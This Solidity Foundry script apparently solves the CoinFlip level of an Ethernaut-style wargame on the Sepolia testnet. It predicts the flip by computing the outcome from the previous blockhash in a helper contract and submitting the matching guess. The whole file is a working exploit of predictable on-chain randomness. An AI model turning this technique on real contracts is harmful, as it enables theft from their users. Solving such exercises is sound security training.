// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level3.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract player{
      uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

     constructor(CoinFlip _coinflipInstance){
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue / FACTOR;
            bool side = coinFlip == 1 ? true : false;
            _coinflipInstance.flip(side);

     } 

}
contract Level3Sol is Script{
    
    CoinFlip public level3 = CoinFlip(0x4d03165ffad46794329037004988b6De42AaC4DB);//pass the contract address deployed on the sepolia testnet
    function run() external{
        
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new player(level3);
        console.log("consecutive wins:",level3.consecutiveWins());
        vm.stopBroadcast();
    }
}